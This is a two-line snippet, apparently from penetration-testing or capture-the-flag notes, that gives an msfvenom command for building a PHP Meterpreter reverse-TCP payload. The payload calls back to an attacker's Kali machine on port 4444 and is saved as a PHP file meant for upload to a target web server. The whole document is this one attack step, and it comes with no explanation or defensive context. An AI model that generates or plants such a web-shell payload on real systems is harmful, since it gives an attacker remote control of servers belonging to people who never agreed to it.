use command create payload
           msfvenom -p php/meterpreter_reverse_tcp LHOST= <kali IP> LPORT=4444 -f raw > fileupload1.php 
